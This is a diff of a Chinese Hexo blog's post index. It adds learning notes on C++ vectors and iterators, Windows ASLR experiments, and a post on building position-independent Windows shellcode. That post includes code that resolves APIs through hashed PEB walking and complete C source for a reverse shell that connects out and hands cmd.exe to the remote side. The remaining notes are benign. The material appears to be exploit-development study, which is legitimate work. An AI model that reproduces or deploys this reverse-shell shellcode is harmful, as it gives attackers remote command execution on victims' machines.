-<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p>TODO!</p>
+
+</li>
+<li><p>常用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size()</span><br><span class="line">.push_back()</span><br><span class="line">.insert(place_iter, value) // 返回一个指向被插入元素的迭代器，可能和第一个参数已经不一样了</span><br><span class="line"></span><br><span class="line">.clear()</span><br><span class="line">for(auto x : v) // 支持范围for</span><br><span class="line">for(auto &amp;x : v) // 注意不要在范围for中改变vector对象的大小</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其它用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == !=</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><blockquote>
+<p>标准库中的每一个容器内都定义了相应的迭代器类型（包括iterator, reverse_iterator, const_iterator)</p>
+<p>能够取代部分指针的作用，且更安全和优雅</p>
+</blockquote>
+<ul>
+<li><p>成员函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.begin() // 返回一个指向容器第一个元素的iter  vector&lt;xxx&gt;::iterator</span><br><span class="line">.end() // 返回一个指向容器最后一个元素的后面的iter,不指向元素</span><br><span class="line">// 如果容器为空。则.begin() = .end(())</span><br><span class="line">.rbegin() // 返回一个指向容器最后一个元素的iter vector&lt;xxx&gt;::reverse_iterator</span><br><span class="line">.rend() // 返回一个指向容器第一个元素的前面的iter,不指向元素</span><br><span class="line">.cbegin() // 返回常量迭代器</span><br><span class="line">.cend() // c++ 11</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其它用法</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">* -&gt; ++ -- == !=</span><br><span class="line">*iter : 返回iter所指向元素的 引用</span><br><span class="line">(*iter).num == iter-&gt;num : 类似指针，当迭代器iter指向结构体时，可以使用*iter返回结构提的引用，也可以直接使用iter-&gt; 访问结构体成员</span><br></pre></td></tr></table></figure></li>
+</ul>
 ]]></content>
       <categories>
-        <category>Windows-PWN</category>
+        <category>C++</category>
       </categories>
   </entry>
   <entry>
     <title>Create a Linux Kernel Module</title>
-    <url>/2023/10/17/Create-a-Linux-Kernel-Module/</url>
+    <url>/2023/10/17/LearningNotes/Create-a-Linux-Kernel-Module/</url>
     <content><![CDATA[<p>创建一个 <code>Linux</code> 内核模块，为 <code>kernel PWN</code> 的学习补充一些基础知识。</p>
 <p>英文原文链接：</p>
 <ul>
@@ -403,8 +489,166 @@
       </categories>
   </entry>
   <entry>
+    <title>winsock practice</title>
+    <url>/2023/10/19/LearningNotes/winsock-practice/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>ASLR in Windows</title>
+    <url>/2023/10/22/Windwos-PWN/ASLR-in-Windows/</url>
+    <content><![CDATA[<p>众所周知，<code>ASLR</code>会使得<code>PE</code>文件的加载基址随机化，但有时候我们还是能够利用固定的地址，指向<code>kernel32.dll ntdll.dll</code>等<code>dll</code>文件中的特定指令，这是为什么呢？</p>
+<p>参考资料：</p>
+<ul>
+<li><p><a href="https://blog.csdn.net/weixin_43742894/article/details/105879904">ntdll 的内存加载位置</a></p>
+</li>
+<li><p><a href="http://www.nynaeve.net/?p=198">Why are certain DLLs required to be at the same base address system-wide? « Nynaeve</a></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Windows</code>和<code>Linux</code>下的<code>ASLR</code>区别很大。</p>
+<p>在<code>Linux</code>下，<code>ASLR</code>的实现分为两个部分</p>
+<ul>
+<li>系统部分，根据<code>/proc/sys/kernel/randomize_va_space</code>中设置的等级，影响 <code>栈、库、mmap、堆</code>（stack .so mmap heap）基址的随机性。</li>
+<li>编译器部分，由<code>PIE</code>选项决定编译得到程序是否是地址无关的，如果是，程序加载基址和全局数据地址（.text .data .bss）就可以随机化。</li>
+</ul>
+<p>在<code>Windwos</code>下，<code>ASLR</code>可由 <code>Visual Studio</code> 下的一个链接器选项——随机基址（<code>/DYNAMICBASE</code>）控制。</p>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="ASLR与程序基址的关系"><a href="#ASLR与程序基址的关系" class="headerlink" title="ASLR与程序基址的关系"></a>ASLR与程序基址的关系</h3><h4 id="开启ASLR"><a href="#开启ASLR" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>使用visual studio生成一个可执行程序<code>Exploime.exe</code>，开启随机基址</p>
+<p><img src="/../pic/ASLR-in-Windows/ASLR-YES.png" alt="ASLR open"></p>
+<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
+<p><img src="/../pic/ASLR-in-Windows/pic1.png" alt="pic1"></p>
+<p>重启windbg，重复上面操作</p>
+<p><img src="/../pic/ASLR-in-Windows/pic2.png" alt="pic2"></p>
+<p>发现，和之前一样。</p>
+<p>重启电脑，再来一次，得到</p>
+<p><img src="/../pic/ASLR-in-Windows/pic3.png" alt="pic3"></p>
+<p>发现各个基址出现变化。</p>
+<h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>关闭随机基址，重新生成<code>Exploime.exe</code></p>
+<p><img src="/../pic/ASLR-in-Windows/ASLR-NO.png" alt="ASLR open"></p>
+<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
+<p><img src="/../pic/ASLR-in-Windows/pic4.png" alt="pic4"></p>
+<p>重启windbg，重复上面操作</p>
+<p><img src="/../pic/ASLR-in-Windows/pic5.png" alt="pic5"></p>
+<p>和上面一致，重启电脑，再来一次，得到</p>
+<p><img src="/../pic/ASLR-in-Windows/pic6.png" alt="pic6"></p>
+<p>发现关闭了<code>ASLR</code>的模块（<code>Exploitme</code>）基址没有变化，其余默认开启了<code>ASLR</code>的系统模块基址发生了变化。</p>
+<h3 id="ASLR与堆栈基址的关系"><a href="#ASLR与堆栈基址的关系" class="headerlink" title="ASLR与堆栈基址的关系"></a>ASLR与堆栈基址的关系</h3><h4 id="开启ASLR-1"><a href="#开启ASLR-1" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>开启<code>ASLR</code>后，可以看出两次运行堆栈地址的变化：</p>
+<p><img src="/../pic/ASLR-in-Windows/address_aslr_1.png" alt="address_aslr_1"></p>
+<p><img src="/../pic/ASLR-in-Windows/address_aslr_2.png" alt="address_aslr_2"></p>
+<h4 id="关闭ASLR-1"><a href="#关闭ASLR-1" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>未开启<code>ASLR</code>时，两次运行程序，查看堆栈地址结果如下，完全一致，不过可以看出其他模块的ASLR还是发挥了作用的：</p>
+<p><img src="/../pic/ASLR-in-Windows/address1.png" alt="address1"></p>
+<p><img src="/../pic/ASLR-in-Windows/address2.png" alt="address2"></p>
+<h3 id="静态比较"><a href="#静态比较" class="headerlink" title="静态比较"></a>静态比较</h3><p>使用<code>Lord PE</code>查看开启<code>ASLR</code>与不开启<code>ASLR</code>程序节的区别，发现前者比后者多一个<code>.reloc</code>节，用于存储重定位信息。</p>
+<p><img src="/../pic/ASLR-in-Windows/sections_aslr.png" alt="sections_aslr"></p>
+<p><img src="/../pic/ASLR-in-Windows/section_noaslr.png" alt="section_noaslr"></p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h3 id="ASLR与程序基址之间的关系"><a href="#ASLR与程序基址之间的关系" class="headerlink" title="ASLR与程序基址之间的关系"></a>ASLR与程序基址之间的关系</h3><p>Windows（至少Win10）下的<code>ASLR</code>机制，对程序基址的影响，只在系统启动时发挥作用，系统运行过程中，各个模块的基址不会变化。</p>
+<p>（和我预想中不太一样，本来以为只有特定的dll是这样，但是上面可以看到一个普通的可执行程序<code>Exploitme</code>也是这样）。</p>
+<h3 id="ASLR与堆栈基址之间的关系"><a href="#ASLR与堆栈基址之间的关系" class="headerlink" title="ASLR与堆栈基址之间的关系"></a>ASLR与堆栈基址之间的关系</h3><p>Windows（至少Win10）下，开启<code>ASLR</code>后，程序的堆栈基址每次运行时都是随机的。</p>
+]]></content>
+      <categories>
+        <category>Windows-PWN</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Create Shellcode in Windows</title>
+    <url>/2023/10/20/Windwos-PWN/Create-Shellcode-in-Windows/</url>
+    <content><![CDATA[<p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode)</a></li>
+</ul>
+<span id="more"></span>
+
+<h2 id="理论准备"><a href="#理论准备" class="headerlink" title="理论准备"></a>理论准备</h2><p>一个好的<code>shellcode</code>，应该满足以下几个条件：</p>
+<ul>
+<li><p>不包含“<code>\X00</code>“：避免<code>shellcode</code>被截断</p>
+</li>
+<li><p>不能直接调用Windows API，而应该从<code>Windows</code>的数据结构体中寻找需要的函数。</p>
+</li>
+<li><p>自包含：仅使用栈变量</p>
+<p>错误写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *v = char[100];</span><br><span class="line">char v[] = &quot;hello world&quot;; # 存储在.rdata节</span><br><span class="line">char *v = &quot;hello world&quot;; # 存储在.data节</span><br></pre></td></tr></table></figure>
+
+<p>正确写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[] = &#123; &#x27;I&#x27;, &#x27;\&#x27;&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27; &#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;g&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>但当字符串过长时，仍会将字符串放到.rdata节，这个就需要使用<code>python</code>脚本从<code>.rdata</code>中将字符串提取出来，同时修改重定位信息，以修复<code>shellcode</code>。</p>
+</li>
+</ul>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><p>编译选项</p>
+<ul>
+<li>关闭sdl</li>
+<li>关闭安全检查 &#x2F;GS-</li>
+<li>优化级别：&#x2F;O1(Minimize Size)</li>
+<li>关闭自动内联：&#x2F;Ob1(Only __inline)</li>
+<li>其它：&#x2F;Oi &#x2F;Os &#x2F;GL &#x2F;Gy</li>
+</ul>
+<p>链接选项</p>
+<ul>
+<li>常规<ul>
+<li>&#x2F;INCREMENTAL:NO</li>
+</ul>
+</li>
+<li>调试<ul>
+<li>&#x2F;MAP(生成存储EXE结构信息的映射文件)（用于后期去除函数和不被使用的数据）</li>
+<li>自定义映射文件名：*Map File Name: mapfile</li>
+</ul>
+</li>
+<li>优化<ul>
+<li>References: Yes(&#x2F;OPT:REF)</li>
+<li>指定代码节中函数的顺序<ul>
+<li>Enable COMPAT Folding: Yes(&#x2F;OPT:ICF)</li>
+<li>Function Order: function_order.txt（指定必须出现在代码节中函数的顺序，我们将entryPoint放在第一个位置，具体要填的函数名可以查看 映射文件mapgfile获得。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><h3 id="getProcAddrByHash"><a href="#getProcAddrByHash" class="headerlink" title="getProcAddrByHash"></a>getProcAddrByHash</h3><p>fs-&gt;TEB </p>
+<p>fs:[30h]-&gt;PEB</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _TEB @$teb</span><br><span class="line">dt _PEB @$peb</span><br><span class="line">dt _PEB_LDR_DATA (xxx)</span><br><span class="line">dt _LIST_ENTRY (xxx)</span><br><span class="line">dt _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>
+
+<p>部分命令结果</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB @$teb</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : (null) </span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : (null) </span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : <span class="number">0x00da5548</span> Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : <span class="number">0x009a0000</span> _PEB</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x008 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x018 DllBase          : Ptr32 Void</span><br><span class="line">   +0x01c EntryPoint       : Ptr32 Void</span><br><span class="line">   +0x020 SizeOfImage      : Uint4B</span><br><span class="line">   +0x024 FullDllName      : _UNICODE_STRING</span><br><span class="line">   +0x02c BaseDllName      : _UNICODE_STRING</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">DWORD hash = getFunctionHash(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">getHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">	DWORD h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*str) &#123;</span><br><span class="line">		h = (h &gt;&gt; <span class="number">13</span>) | (h &lt;&lt; (<span class="number">32</span><span class="number">-13</span>)); <span class="comment">//ROR h,13</span></span><br><span class="line">		h += *str &gt;= <span class="string">&#x27;a&#x27;</span> ? *str<span class="number">-32</span> : *str; <span class="comment">// 转换为大写字母</span></span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">getFunctionHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* moduleName, <span class="type">const</span> <span class="type">char</span>* funtionName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getHash(moduleName) + getHash(functionName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_inline PEB* <span class="title function_">getPEB</span><span class="params">()</span> &#123;</span><br><span class="line">    PEB *p;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">30</span>h] <span class="comment">// fs指向TEB, fs:[30h]指向PEB</span></span><br><span class="line">        mov p, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">getProcAddrByHash</span><span class="params">(DWORD hash)</span> &#123;</span><br><span class="line">    <span class="comment">// 首先获取PEB(Process Environment Block)的地址</span></span><br><span class="line">    PEB* peb = getPEB();</span><br><span class="line">    LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">    LIST_ENTRY* ptr = first;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);</span><br><span class="line">        ptr = ptr-&gt;Flink;</span><br><span class="line">        BYTE* baseAddress = (Byte*)dte-&gt;DllBase;</span><br><span class="line">        <span class="keyword">if</span>()</span><br><span class="line">    &#125; <span class="keyword">while</span>(ptr != first);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="shellcode范例"><a href="#shellcode范例" class="headerlink" title="shellcode范例"></a>shellcode范例</h3><p>一个简单的<code>reverse shell</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span>               <span class="comment">// must preceed #include &lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> htons(A) ((((WORD)(A) &amp; 0xff00) &gt;&gt; 8) | (((WORD)(A) &amp; 0x00ff) &lt;&lt; 8))</span></span><br><span class="line"> </span><br><span class="line">_inline PEB *<span class="title function_">getPEB</span><span class="params">()</span> &#123;</span><br><span class="line">    PEB *p;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov     eax, fs:[<span class="number">30</span>h]</span><br><span class="line">        mov     p, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    DWORD h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        h = (h &gt;&gt; <span class="number">13</span>) | (h &lt;&lt; (<span class="number">32</span> - <span class="number">13</span>));       <span class="comment">// ROR h, 13</span></span><br><span class="line">        h += *str &gt;= <span class="string">&#x27;a&#x27;</span> ? *str - <span class="number">32</span> : *str;    <span class="comment">// convert the character to uppercase</span></span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getFunctionHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *moduleName, <span class="type">const</span> <span class="type">char</span> *functionName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getHash(moduleName) + getHash(functionName);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">LDR_DATA_TABLE_ENTRY *<span class="title function_">getDataTableEntry</span><span class="params">(<span class="type">const</span> LIST_ENTRY *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    <span class="keyword">return</span> (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> This function doesn&#x27;t work with forwarders. For instance, kernel32.ExitThread forwards to</span></span><br><span class="line"><span class="comment">//       ntdll.RtlExitUserThread. The solution is to follow the forwards manually.</span></span><br><span class="line">PVOID <span class="title function_">getProcAddrByHash</span><span class="params">(DWORD hash)</span> &#123;</span><br><span class="line">    PEB *peb = getPEB();</span><br><span class="line">    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">    LIST_ENTRY *ptr = first;</span><br><span class="line">    <span class="keyword">do</span> &#123;                            <span class="comment">// for each module</span></span><br><span class="line">        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);</span><br><span class="line">        ptr = ptr-&gt;Flink;</span><br><span class="line"> </span><br><span class="line">        BYTE *baseAddress = (BYTE *)dte-&gt;DllBase;</span><br><span class="line">        <span class="keyword">if</span> (!baseAddress)           <span class="comment">// invalid module(???)</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;</span><br><span class="line">        IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader-&gt;e_lfanew);</span><br><span class="line">        DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">        <span class="keyword">if</span> (!iedRVA)                <span class="comment">// Export Directory not present</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);</span><br><span class="line">        <span class="type">char</span> *moduleName = (<span class="type">char</span> *)(baseAddress + ied-&gt;Name);</span><br><span class="line">        DWORD moduleHash = getHash(moduleName);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th</span></span><br><span class="line">        <span class="comment">// element of both arrays refer to the same function. The first array specifies the name whereas</span></span><br><span class="line">        <span class="comment">// the second the ordinal. This ordinal can then be used as an index in the array pointed to by</span></span><br><span class="line">        <span class="comment">// AddressOfFunctions to find the entry point of the function.</span></span><br><span class="line">        DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);</span><br><span class="line">        <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; ied-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">            <span class="type">char</span> *functionName = (<span class="type">char</span> *)(baseAddress + nameRVAs[i]);</span><br><span class="line">            <span class="keyword">if</span> (hash == moduleHash + getHash(functionName)) &#123;</span><br><span class="line">                WORD ordinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];</span><br><span class="line">                DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];</span><br><span class="line">                <span class="keyword">return</span> baseAddress + functionRVA;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ptr != first);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;            <span class="comment">// address not found</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_LoadLibraryA           0xf8b7108d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAStartup             0x2ddcd540</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSACleanup             0x0b9d13bc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSASocketA             0x9fd4f16f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAConnect             0xa50da182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_CreateProcessA         0x231cbe70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_ntoa              0x1b73fed1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_addr              0x011bfae2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getaddrinfo            0xdc2953c9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getnameinfo            0x5c1c856e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WaitForSingleObject    0xca8e9498</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//  printf(&quot;0x%08x\n&quot;, getFunctionHash(&quot;kernel32.dll&quot;, &quot;WaitForSingleObject&quot;));</span></span><br><span class="line"><span class="comment">//  return 0;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but</span></span><br><span class="line">    <span class="comment">//       they&#x27;re not strictly needed.</span></span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(LoadLibraryA);</span><br><span class="line"> </span><br><span class="line">    My_LoadLibraryA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(WSAStartup);</span><br><span class="line">    DefineFuncPtr(WSASocketA);</span><br><span class="line">    DefineFuncPtr(WSAConnect);</span><br><span class="line">    DefineFuncPtr(CreateProcessA);</span><br><span class="line">    DefineFuncPtr(inet_ntoa);</span><br><span class="line">    DefineFuncPtr(inet_addr);</span><br><span class="line">    DefineFuncPtr(getaddrinfo);</span><br><span class="line">    DefineFuncPtr(getnameinfo);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line">    DefineFuncPtr(WaitForSingleObject);</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hostName = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> hostPort = <span class="number">123</span>;</span><br><span class="line"> </span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData))</span><br><span class="line">        <span class="keyword">goto</span> __end;         <span class="comment">// error</span></span><br><span class="line">    SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    addrinfo *result;</span><br><span class="line">    <span class="keyword">if</span> (My_getaddrinfo(hostName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;result))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line">    <span class="type">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">    My_getnameinfo(result-&gt;ai_addr, result-&gt;ai_addrlen, ip_addr, <span class="keyword">sizeof</span>(ip_addr), <span class="literal">NULL</span>, <span class="number">0</span>, NI_NUMERICHOST);</span><br><span class="line"> </span><br><span class="line">    SOCKADDR_IN remoteAddr;</span><br><span class="line">    remoteAddr.sin_family = AF_INET;</span><br><span class="line">    remoteAddr.sin_port = htons(hostPort);</span><br><span class="line">    remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAConnect(sock, (SOCKADDR *)&amp;remoteAddr, <span class="keyword">sizeof</span>(remoteAddr), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    STARTUPINFOA sInfo;</span><br><span class="line">    PROCESS_INFORMATION procInfo;</span><br><span class="line">    SecureZeroMemory(&amp;sInfo, <span class="keyword">sizeof</span>(sInfo));        <span class="comment">// avoids a call to _memset</span></span><br><span class="line">    sInfo.cb = <span class="keyword">sizeof</span>(sInfo);</span><br><span class="line">    sInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;</span><br><span class="line">    My_CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;procInfo);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Waits for the process to finish.</span></span><br><span class="line">    My_WaitForSingleObject(procInfo.hProcess, INFINITE);</span><br><span class="line"> </span><br><span class="line">__end:</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> entryPoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p>TODO!</p>
+]]></content>
+      <categories>
+        <category>Windows-PWN</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>社科知识</title>
+    <url>/2023/10/23/%E7%A4%BE%E7%A7%91/%E7%A4%BE%E7%A7%91%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>介绍一些基础的社科知识，主要包括源自启蒙时代的一系列概念，以及一些我认为有价值的观点的介绍。</p>
+<span id="more"></span>
+
+
+
